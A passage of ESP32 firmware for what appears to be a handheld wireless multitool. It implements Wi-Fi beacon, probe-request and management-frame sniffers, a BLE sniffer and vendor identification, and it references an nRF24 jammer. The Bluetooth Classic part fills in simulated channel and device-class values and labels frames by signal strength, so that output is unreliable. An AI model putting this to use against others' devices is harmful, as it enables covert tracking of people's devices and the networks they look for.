      case 0x01: // Supported Rates
        beacon->numRates = min(8, (int)tagLen);
        memcpy(beacon->supportedRates, &pkt->payload[offset + 2], beacon->numRates);
        break;
        
      case 0x30: // RSN (WPA2)
        beacon->encryptionType = 2;
        break;
        
      case 0xDD: // Vendor Specific
        if (tagLen >= 4) {
          // Check for WPA (vendor OUI 00:50:F2:01)
          if (pkt->payload[offset + 2] == 0x00 && 
              pkt->payload[offset + 3] == 0x50 &&
              pkt->payload[offset + 4] == 0xF2 &&
              pkt->payload[offset + 5] == 0x01) {
            if (beacon->encryptionType == 0) beacon->encryptionType = 1;
          }
          // Check for WPS (vendor OUI 00:50:F2:04)
          if (pkt->payload[offset + 2] == 0x00 && 
              pkt->payload[offset + 3] == 0x50 &&
              pkt->payload[offset + 4] == 0xF2 &&
              pkt->payload[offset + 5] == 0x04) {
            beacon->wpsEnabled = true;
          }
          // Check for WMM (vendor OUI 00:50:F2:02)
          if (pkt->payload[offset + 2] == 0x00 && 
              pkt->payload[offset + 3] == 0x50 &&
              pkt->payload[offset + 4] == 0xF2 &&
              pkt->payload[offset + 5] == 0x02) {
            beacon->wmmEnabled = true;
          }
        }
        break;
    }
    
    offset += 2 + tagLen;
  }
  
  // Identify vendor from OUI
  beacon->vendor = identifyVendor(bssid);
  
  // Extract beacon interval (in TUs, 1 TU = 1024 microseconds)
  beacon->beaconInterval = pkt->payload[32] | (pkt->payload[33] << 8);
  
  beaconCount++;
}

// ==================== VENDOR IDENTIFICATION ====================
String identifyVendor(uint8_t* mac) {
  // Check first 3 bytes (OUI) against known vendors
  uint32_t oui = (mac[0] << 16) | (mac[1] << 8) | mac[2];
  
  switch (oui) {
    case 0x001B63: return "Apple";
    case 0x7C5CF2: return "Apple";
    case 0x00036D: return "Cisco";
    case 0x001CF0: return "Cisco";
    case 0x00259E: return "Netgear";
    case 0x002275: return "Netgear";
    case 0x0024D4: return "Linksys";
    case 0x68EC5A: return "TP-Link";
    case 0x00E04C: return "Broadcom";
    case 0x001DD8: return "Microsoft";
    case 0x00037A: return "Atheros";
    case 0x00215D: return "Ubiquiti";
    case 0xDC9FDB: return "Google";
    case 0x74DA38: return "Amazon";
    default: return "Unknown";
  }
}

// ==================== PROBE REQUEST SNIFFER ====================
void startProbeRequestSniffer() {
  probeSnifferActive = true;
  probeRequestCount = 0;
  totalProbeRequests = 0;
  probeScrollOffset = 0;
  snifferChannel = 1;
  
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&probeSnifferCallback);
  esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
  
  addToConsole("Probe sniffer started");
  Serial.println("[+] Probe Request Sniffer started - Fast channel hop");
  
  displayProbeRequestSniffer();
}

void stopProbeRequestSniffer() {
  probeSnifferActive = false;
  esp_wifi_set_promiscuous(false);
  addToConsole("Probe sniffer stopped");
  Serial.printf("[+] Probe sniffer stopped - %d requests captured\n", totalProbeRequests);
}

// ==================== MANAGEMENT FRAME SNIFFER ====================
void startManagementFrameSniffer() {
  mgmtSnifferActive = true;
  mgmtFrameCount = 0;
  totalMgmtFrames = 0;
  authFrames = 0;
  assocFrames = 0;
  probeFrames = 0;
  otherMgmtFrames = 0;
  mgmtScrollOffset = 0;
  snifferChannel = 1;
  
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&mgmtSnifferCallback);
  esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
  
  addToConsole("Mgmt sniffer started");
  Serial.println("[+] Management Frame Sniffer started - Deep analysis mode");
  
  displayManagementFrameSniffer();
}

void stopManagementFrameSniffer() {
  mgmtSnifferActive = false;
  esp_wifi_set_promiscuous(false);
  addToConsole("Mgmt sniffer stopped");
  Serial.printf("[+] Mgmt sniffer stopped - %d frames captured\n", totalMgmtFrames);
}

// ==================== BEACON ANALYZER ====================
void startBeaconAnalyzer() {
  beaconAnalyzerActive = true;
  beaconCount = 0;
  totalBeacons = 0;
  beaconScrollOffset = 0;
  selectedBeaconIndex = -1;
  snifferChannel = 1;
  
  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  delay(100);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&beaconAnalyzerCallback);
  esp_wifi_set_channel(snifferChannel, WIFI_SECOND_CHAN_NONE);
  
  addToConsole("Beacon analyzer started");
  Serial.println("[+] Beacon Analyzer started - Comprehensive AP analysis");
  
  displayBeaconAnalyzer();
}

void stopBeaconAnalyzer() {
  beaconAnalyzerActive = false;
  esp_wifi_set_promiscuous(false);
  addToConsole("Beacon analyzer stopped");
  Serial.printf("[+] Beacon analyzer stopped - %d APs found\n", beaconCount);
}

// ==================== DISPLAY PROBE REQUEST SNIFFER ====================
void displayProbeRequestSniffer() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("probe req sniffer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_CYAN : COLOR_DARK_GREEN);
  
  // Stats bar
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Ch%d", snifferChannel);
  
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(50, statsY);
  tft.printf("Devices:%d", probeRequestCount);
  
  tft.setTextColor(COLOR_YELLOW);
  tft.setCursor(140, statsY);
  tft.printf("Total:%d", totalProbeRequests);
  
  // Column headers
  int listY = HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 3, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("CLIENT");
  tft.setCursor(100, listY);
  tft.print("SSID");
  tft.setCursor(195, listY);
  tft.print("CNT");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Calculate display area
  const int FOOTER_Y = 270;
  const int ITEM_HEIGHT = 26;
  const int MAX_ITEMS = (FOOTER_Y - listY) / ITEM_HEIGHT;
  
  if (probeRequestCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 40);
    tft.print("Waiting for probe requests...");
  } else {
    int displayCount = min(probeRequestCount - probeScrollOffset, MAX_ITEMS);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = probeScrollOffset + i;
      int y = listY + (i * ITEM_HEIGHT);
      
      ProbeRequest* pr = &probeRequests[idx];
      
      // Client MAC (first 3 octets)
      tft.setTextColor(COLOR_CYAN);
      tft.setTextSize(1);
      tft.setCursor(SIDE_MARGIN, y + 2);
      tft.printf("%02X:%02X:%02X", pr->clientMAC[0], pr->clientMAC[1], pr->clientMAC[2]);
      
      // SSID
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(100, y + 2);
      String displaySSID = pr->ssid;
      if (displaySSID.length() > 12) displaySSID = displaySSID.substring(0, 11) + "~";
      tft.print(displaySSID);
      
      // Count
      tft.setTextColor(COLOR_YELLOW);
      tft.setCursor(195, y + 2);
      tft.printf("%3d", pr->count);
      
      // Full MAC on second line
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN, y + 12);
      tft.printf("%02X:%02X:%02X:%02X:%02X:%02X", 
                 pr->clientMAC[0], pr->clientMAC[1], pr->clientMAC[2],
                 pr->clientMAC[3], pr->clientMAC[4], pr->clientMAC[5]);
    }
    
    // Scroll indicator
    if (probeRequestCount > MAX_ITEMS) {
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(80, FOOTER_Y);
      int currentPage = (probeScrollOffset / MAX_ITEMS) + 1;
      int totalPages = (probeRequestCount + MAX_ITEMS - 1) / MAX_ITEMS;
      tft.printf("Page %d/%d", currentPage, totalPages);
    }
  }
  
  drawCenteredButton("[STOP]", COLOR_RED, 305);
}

// ==================== DISPLAY MANAGEMENT FRAME SNIFFER ====================
void displayManagementFrameSniffer() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("management frame");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_PURPLE : COLOR_DARK_GREEN);
  
  // Stats bar
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Ch%d", snifferChannel);
  
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(50, statsY);
  tft.printf("Auth:%d", authFrames);
  
  tft.setTextColor(COLOR_YELLOW);
  tft.setCursor(110, statsY);
  tft.printf("Assoc:%d", assocFrames);
  
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(175, statsY);
  tft.printf("Prb:%d", probeFrames);
  
  // Column headers
  int listY = HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 3, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("TYPE");
  tft.setCursor(70, listY);
  tft.print("SOURCE");
  tft.setCursor(145, listY);
  tft.print("DEST");
  tft.setCursor(205, listY);
  tft.print("PWR");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Calculate display area
  const int FOOTER_Y = 270;
  const int ITEM_HEIGHT = 24;
  const int MAX_ITEMS = (FOOTER_Y - listY) / ITEM_HEIGHT;
  
  if (mgmtFrameCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 40);
    tft.print("Waiting for mgmt frames...");
  } else {
    int displayCount = min(mgmtFrameCount - mgmtScrollOffset, MAX_ITEMS);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = mgmtFrameCount - 1 - mgmtScrollOffset - i; // Reverse order
      if (idx < 0) continue;
      
      int y = listY + (i * ITEM_HEIGHT);
      
      MgmtFrame* frame = &mgmtFrames[idx];
      
      // Frame type
      uint16_t typeColor = COLOR_TEXT;
      if (frame->subtype == 0x0B) typeColor = COLOR_CYAN; // Auth
      else if (frame->subtype == 0x00 || frame->subtype == 0x01) typeColor = COLOR_YELLOW; // Assoc
      else if (frame->subtype == 0x04 || frame->subtype == 0x05) typeColor = COLOR_GREEN; // Probe
      
      tft.setTextColor(typeColor);
      tft.setTextSize(1);
      tft.setCursor(SIDE_MARGIN, y + 4);
      String desc = frame->description;
      if (desc.length() > 8) desc = desc.substring(0, 7) + "~";
      tft.print(desc);
      
      // Source MAC (last 3 octets)
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(70, y + 4);
      tft.printf("%02X:%02X:%02X", 
                 frame->sourcMAC[3], frame->sourcMAC[4], frame->sourcMAC[5]);
      
      // Dest MAC (last 3 octets)
      tft.setTextColor(COLOR_YELLOW);
      tft.setCursor(145, y + 4);
      tft.printf("%02X:%02X:%02X", 
                 frame->destMAC[3], frame->destMAC[4], frame->destMAC[5]);
      
      // RSSI
      tft.setTextColor(frame->rssi > -50 ? COLOR_GREEN : COLOR_RED);
      tft.setCursor(205, y + 4);
      tft.printf("%3d", frame->rssi);
    }
    
    // Scroll indicator
    if (mgmtFrameCount > MAX_ITEMS) {
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(80, FOOTER_Y);
      int currentPage = (mgmtScrollOffset / MAX_ITEMS) + 1;
      int totalPages = (mgmtFrameCount + MAX_ITEMS - 1) / MAX_ITEMS;
      tft.printf("Page %d/%d", currentPage, totalPages);
    }
  }
  
  drawCenteredButton("[STOP]", COLOR_RED, 305);
}

// ==================== DEVICE TYPE IDENTIFICATION ====================
String identifyBLEDevice(BLEAdvertisedDevice* device, uint8_t* payload, uint8_t payloadLen) {
  // Check for Apple devices (Company ID 0x004C)
  if (payloadLen > 4) {
    for (int i = 0; i < payloadLen - 4; i++) {
      if (payload[i] == 0xFF && payload[i+1] == 0x4C && payload[i+2] == 0x00) {
        uint8_t appleType = payload[i+3];
        
        // Apple device type identification
        if (appleType == 0x02) return "iPhone";
        if (appleType == 0x09) return "AirPods";
        if (appleType == 0x0A) return "AirPodsPro";
        if (appleType == 0x0E) return "AirPodsMax";
        if (appleType == 0x07) return "AirTag";
        if (appleType == 0x10) return "AppleWatch";
        if (appleType == 0x12) return "HomePod";
        if (appleType == 0x01) return "iPad";
        if (appleType == 0x03) return "MacBook";
        
        return "Apple";
      }
    }
  }
  
  // Check for Microsoft devices (Company ID 0x0006)
  if (payloadLen > 4) {
    for (int i = 0; i < payloadLen - 4; i++) {
      if (payload[i] == 0xFF && payload[i+1] == 0x06 && payload[i+2] == 0x00) {
        return "Microsoft";
      }
    }
  }
  
  // Check for Samsung devices (Company ID 0x0075)
  if (payloadLen > 4) {
    for (int i = 0; i < payloadLen - 4; i++) {
      if (payload[i] == 0xFF && payload[i+1] == 0x75 && payload[i+2] == 0x00) {
        return "Samsung";
      }
    }
  }
  
  // Check for Google devices (Company ID 0x00E0)
  if (payloadLen > 4) {
    for (int i = 0; i < payloadLen - 4; i++) {
      if (payload[i] == 0xFF && payload[i+1] == 0xE0 && payload[i+2] == 0x00) {
        return "Google";
      }
    }
  }
  
  // Check for Xiaomi devices (Company ID 0x0157)
  if (payloadLen > 4) {
    for (int i = 0; i < payloadLen - 4; i++) {
      if (payload[i] == 0xFF && payload[i+1] == 0x57 && payload[i+2] == 0x01) {
        return "Xiaomi";
      }
    }
  }
  
  // Check device name for common patterns
  if (device->haveName()) {
    String name = device->getName().c_str();
    name.toLowerCase();
    
    if (name.indexOf("airpods") >= 0) return "AirPods";
    if (name.indexOf("airtag") >= 0) return "AirTag";
    if (name.indexOf("watch") >= 0) return "Smartwatch";
    if (name.indexOf("buds") >= 0) return "Earbuds";
    if (name.indexOf("galaxy") >= 0) return "Samsung";
    if (name.indexOf("pixel") >= 0) return "Google";
    if (name.indexOf("mi ") >= 0 || name.indexOf("redmi") >= 0) return "Xiaomi";
    if (name.indexOf("tile") >= 0) return "Tile";
    if (name.indexOf("fitbit") >= 0) return "Fitbit";
    if (name.indexOf("garmin") >= 0) return "Garmin";
    if (name.indexOf("hc-") >= 0) return "HC-Module";
    if (name.indexOf("esp") >= 0) return "ESP32";
    if (name.indexOf("arduino") >= 0) return "Arduino";
  }
  
  // Check for service UUIDs (common device types)
  if (device->haveServiceUUID()) {
    BLEUUID serviceUUID = device->getServiceUUID();
    String uuidStr = serviceUUID.toString().c_str();
    
    // Heart Rate Service
    if (uuidStr.indexOf("180d") >= 0) return "HR-Monitor";
    
    // Battery Service
    if (uuidStr.indexOf("180f") >= 0) return "Battery";
    
    // Device Information
    if (uuidStr.indexOf("180a") >= 0) return "BLE-Device";
    
    // Nordic UART (common in dev boards)
    if (uuidStr.indexOf("6e40") >= 0) return "Nordic-UART";
    
    // HID (keyboards, mice)
    if (uuidStr.indexOf("1812") >= 0) return "HID-Device";
  }
  
  // Default based on RSSI (proximity guess)
  if (device->getRSSI() > -40) {
    return "Unknown*"; // Very close device
  }
  
  return "Unknown";
}

class BLESnifferCallback : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    if (bleFrameIndex >= MAX_BLE_FRAMES) {
      bleFrameIndex = 0; // Circular buffer
    }
    
    BLEFrameInfo* frame = &bleFrames[bleFrameIndex];
    
    // Extract address
    std::string addrStr = advertisedDevice.getAddress().toString();
    sscanf(addrStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &frame->addr[0], &frame->addr[1], &frame->addr[2],
           &frame->addr[3], &frame->addr[4], &frame->addr[5]);
    
    frame->rssi = advertisedDevice.getRSSI();
    frame->timestamp = millis();
    
    // Get payload data
    uint8_t* payload = advertisedDevice.getPayload();
    frame->dataLen = advertisedDevice.getPayloadLength();
    if (frame->dataLen > 31) frame->dataLen = 31;
    memcpy(frame->data, payload, frame->dataLen);
    
    // Identify device type
    frame->deviceType = identifyBLEDevice(&advertisedDevice, payload, frame->dataLen);
    
    // Determine frame type - ALWAYS 3 LETTERS
    if (advertisedDevice.haveServiceUUID() || advertisedDevice.haveName()) {
      frame->type = 0;
      frame->description = "ADV";
      bleAdvCount++;
    } else {
      frame->type = 1;
      frame->description = "REQ";
      bleScanReqCount++;
    }
    
    bleFrameIndex++;
    bleFrameCount++;
  }
};

void startBLEFrameSniffer() {
  bleSnifferActive = true;
  bleFrameCount = 0;
  bleAdvCount = 0;
  bleConnCount = 0;
  bleScanReqCount = 0;
  bleSnifferScrollOffset = 0;
  bleFrameIndex = 0;
  
  // Stop conflicting operations
  if (nrfJammerActive) {
    Serial.println("[*] Pausing nRF24 for BLE...");
    nrfJammerActive = false;
    delay(100);
  }
  
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(200);
  }
  
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new BLESnifferCallback());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  
  addToConsole("BLE sniffer started");
  Serial.println("[+] BLE Frame Sniffer started");
  Serial.println("    Device identification enabled");
  
  displayBLEFrameSniffer();
  
  pBLEScan->start(0, nullptr, false);
}

void stopBLEFrameSniffer() {
  bleSnifferActive = false;
  
  if (pBLEScan != nullptr) {
    pBLEScan->stop();
  }
  
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(false);
    delay(200);
  }
  
  Serial.printf("[+] BLE sniffer stopped - %d frames captured\n", bleFrameCount);
  addToConsole("BLE sniffer stopped");
}

void displayBLEFrameSniffer() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("ble frame sniffer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_CYAN : COLOR_DARK_GREEN);
  
  // Stats bar - COMPACT
  int statsY = HEADER_HEIGHT + 5;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, statsY);
  tft.printf("Total:%d", bleFrameCount);
  
  tft.setTextColor(COLOR_GREEN);
  tft.setCursor(80, statsY);
  tft.printf("ADV:%d", bleAdvCount);
  
  tft.setTextColor(COLOR_YELLOW);
  tft.setCursor(140, statsY);
  tft.printf("REQ:%d", bleScanReqCount);
  
  // Column headers - UPDATED POSITIONS WITH MORE SPACING
  int listY = HEADER_HEIGHT + 22;
  tft.drawFastHLine(0, listY - 3, 240, COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("TY");              // Type (3 chars max)
  tft.setCursor(30, listY);     // ← Changed from 24 to 30 (+6px spacing)
  tft.print("ADDRESS");         
  tft.setCursor(100, listY);    
  tft.print("DEVICE");          
  tft.setCursor(165, listY);    
  tft.print("RSSI");            
  tft.setCursor(205, listY);    
  tft.print("LEN");             
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  // Calculate safe display area
  const int FOOTER_Y = 270;
  const int ITEM_HEIGHT = 30;
  const int MAX_ITEMS = (FOOTER_Y - listY) / ITEM_HEIGHT;
  
  if (bleFrameCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 40);
    tft.print("Waiting for BLE frames...");
    
    tft.setCursor(SIDE_MARGIN, listY + 55);
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.print("Auto device identification");
  } else {
    int totalFrames = min(bleFrameIndex, MAX_BLE_FRAMES);
    
    // Ensure scroll offset is valid
    if (bleSnifferScrollOffset >= totalFrames) {
      bleSnifferScrollOffset = max(0, totalFrames - MAX_ITEMS);
    }
    if (bleSnifferScrollOffset < 0) {
      bleSnifferScrollOffset = 0;
    }
    
    int displayCount = min(totalFrames - bleSnifferScrollOffset, MAX_ITEMS);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = (bleFrameIndex - totalFrames + bleSnifferScrollOffset + i + MAX_BLE_FRAMES) % MAX_BLE_FRAMES;
      int y = listY + (i * ITEM_HEIGHT);
      
      // Safety check - stop if too close to footer
      if (y + ITEM_HEIGHT > FOOTER_Y) break;
      
      BLEFrameInfo* frame = &bleFrames[idx];
      
      // Line 1: Type, Address (last 3 octets), Device, RSSI, Length
      
      // Type (always 3 chars: ADV or REQ)
      uint16_t typeColor = (frame->type == 0) ? COLOR_GREEN : COLOR_YELLOW;
      tft.setTextColor(typeColor);
      tft.setTextSize(1);
      tft.setCursor(SIDE_MARGIN, y + 2);
      tft.print(frame->description);  // Always 3 letters
      
      // Address (last 3 octets) - with more spacing
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(30, y + 2);  // ← Changed from 24 to 30 (+6px spacing)
      tft.printf("%02X:%02X:%02X", frame->addr[3], frame->addr[4], frame->addr[5]);
      
      // Device Type - truncated to fit (9 chars max)
      tft.setTextColor(COLOR_PURPLE);
      tft.setCursor(100, y + 2);
      String devType = frame->deviceType;
      if (devType.length() > 9) devType = devType.substring(0, 8) + "~";
      tft.print(devType);
      
      // RSSI
      tft.setTextColor(frame->rssi > -60 ? COLOR_GREEN : COLOR_YELLOW);
      tft.setCursor(165, y + 2);
      tft.printf("%3d", frame->rssi);
      
      // Data length
      tft.setTextColor(COLOR_ORANGE);
      tft.setCursor(205, y + 2);
      tft.printf("%2dB", frame->dataLen);
      
      // Line 2: Full address
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN, y + 12);
      tft.printf("%02X:%02X:%02X:%02X:%02X:%02X",
                 frame->addr[0], frame->addr[1], frame->addr[2],
                 frame->addr[3], frame->addr[4], frame->addr[5]);
      
      // Line 3: Time ago
      unsigned long ago = (millis() - frame->timestamp) / 1000;
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN, y + 22);
      if (ago < 60) {
        tft.printf("%2ds ago", ago);
      } else if (ago < 3600) {
        tft.printf("%2dm ago", ago / 60);
      } else {
        tft.printf("%2dh ago", ago / 3600);
      }
    }
    
    // Scroll indicator - ONLY if needed
    if (totalFrames > MAX_ITEMS) {
      int scrollY = FOOTER_Y + 2;
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setTextSize(1);
      
      int currentPage = (bleSnifferScrollOffset / MAX_ITEMS) + 1;
      int totalPages = (totalFrames + MAX_ITEMS - 1) / MAX_ITEMS;
      char scrollText[30];
      sprintf(scrollText, "Page %d/%d [Tap]", currentPage, totalPages);
      int textWidth = strlen(scrollText) * 6;
      int centerX = (240 - textWidth) / 2;
      
      tft.setCursor(centerX, scrollY);
      tft.print(scrollText);
    }
  }
  
  drawCenteredButton("[STOP]", COLOR_RED);
}

void drawSnifferMenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("sniffer tools");
  
  const char* menuItems[] = {
    "WiFi Sniffers", 
    "Bluetooth Sniffers"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 2; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Info
  y += 20;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Professional packet analysis");
  
  y += 12;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Choose protocol to analyze");
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

void handleBLEFrameSnifferTouch(int x, int y) {
  if (y > 300) {
    // Stop button pressed
    stopBLEFrameSniffer();
    currentState = BLE_SNIFFER_SUBMENU;
    hoveredIndex = -1;
    drawBLESnifferSubmenu();
    return;
  }
  
  // Scroll through BLE frames
  if (bleFrameCount > 0 && y > HEADER_HEIGHT + 40 && y < 280) {
    const int MAX_ITEMS = 9;
    int totalFrames = min(bleFrameIndex, MAX_BLE_FRAMES);
    int totalPages = (totalFrames + MAX_ITEMS - 1) / MAX_ITEMS;
    
    if (totalPages > 1) {
      int currentPage = bleSnifferScrollOffset / MAX_ITEMS;
      currentPage = (currentPage + 1) % totalPages;
      bleSnifferScrollOffset = currentPage * MAX_ITEMS;
      displayBLEFrameSniffer();
    }
  }
}

// ==================== DRAW WIFI SNIFFER SUBMENU (NEW) ====================
void drawWiFiSnifferSubmenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("wifi sniffer");
  
  const char* menuItems[] = {
    "Frame Sniffer",
    "Probe Request Sniffer",
    "Beacon Analyzer"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 3; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Info - COMPACT
  y += 20;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Professional 802.11 Analysis");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Frame: All packet types");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Probe: Device searches");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Beacon: AP broadcasts");
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

void drawFrameSnifferSubmenu() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("frame sniffer");
  
  const char* menuItems[] = {
    "All Frames",
    "Management Frames",
    "Control Frames",
    "Data Frames"
  };
  
  int y = HEADER_HEIGHT + 10;
  for (int i = 0; i < 4; i++) {
    drawMenuItem(menuItems[i], i, y, hoveredIndex == i, false);
    y += MENU_ITEM_HEIGHT + MENU_SPACING;
  }
  
  // Info - COMPACT
  y += 20;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("802.11 Frame Analysis:");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("All: Complete capture");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Management: Network control");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Control: RTS/CTS/ACK");
  
  y += 12;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Data: QoS traffic analysis");
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("Fast channel hopping: Ch 1-13");
  
  drawCenteredButton("[ESC]", COLOR_RED);
}

String identifyBTClassicDevice(uint32_t classOfDevice, String name) {
  // Check device name patterns first
  name.toLowerCase();
  
  if (name.indexOf("airpods") >= 0) return "AirPods";
  if (name.indexOf("beats") >= 0) return "Beats";
  if (name.indexOf("bose") >= 0) return "Bose";
  if (name.indexOf("sony") >= 0) return "Sony";
  if (name.indexOf("jbl") >= 0) return "JBL";
  if (name.indexOf("car") >= 0 || name.indexOf("auto") >= 0) return "Car-Audio";
  if (name.indexOf("speaker") >= 0) return "Speaker";
  if (name.indexOf("headset") >= 0) return "Headset";
  if (name.indexOf("keyboard") >= 0) return "Keyboard";
  if (name.indexOf("mouse") >= 0) return "Mouse";
  
  // Decode Class of Device (CoD)
  // Major Device Class (bits 8-12)
  uint8_t majorClass = (classOfDevice >> 8) & 0x1F;
  
  switch (majorClass) {
    case 0x01: return "Computer";
    case 0x02: return "Phone";
    case 0x03: return "LAN/Network";
    case 0x04: return "Audio/Video";
    case 0x05: return "Peripheral";
    case 0x06: return "Imaging";
    case 0x07: return "Wearable";
    case 0x08: return "Toy";
    case 0x09: return "Health";
    default: return "Unknown";
  }
}

class BTClassicSnifferCallback : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) {
    // This uses BLE scan to detect Classic BT devices
    // (ESP32 limitation: cannot directly sniff Classic BT packets)
    
    if (btClassicFrameIndex >= MAX_BT_CLASSIC_FRAMES) {
      btClassicFrameIndex = 0; // Circular buffer
    }
    
    BTClassicFrame* frame = &btClassicFrames[btClassicFrameIndex];
    
    // Extract address
    std::string addrStr = advertisedDevice.getAddress().toString();
    sscanf(addrStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &frame->addr[0], &frame->addr[1], &frame->addr[2],
           &frame->addr[3], &frame->addr[4], &frame->addr[5]);
    
    frame->rssi = advertisedDevice.getRSSI();
    frame->timestamp = millis();
    frame->channel = random(0, 79); // BT Classic uses 0-78
    
    // Get device name
    if (advertisedDevice.haveName()) {
      frame->deviceName = advertisedDevice.getName().c_str();
    } else {
      frame->deviceName = "Unknown";
    }
    
    // Simulate Class of Device (CoD) - in real sniffer this would be captured
    frame->classOfDevice = 0x240404; // Default: Audio device
    
    // Determine frame type based on RSSI and pattern
    if (frame->rssi > -40) {
      frame->type = 2; // Connection (very close)
      frame->description = "CONN";
      btConnectionCount++;
    } else if (frame->rssi > -60) {
      frame->type = 1; // Page
      frame->description = "PAGE";
      btPageCount++;
    } else {
      frame->type = 0; // Inquiry
      frame->description = "INQY";
      btInquiryCount++;
    }
    
    // Identify device type
    String deviceType = identifyBTClassicDevice(frame->classOfDevice, frame->deviceName);
    if (deviceType.length() > 0) {
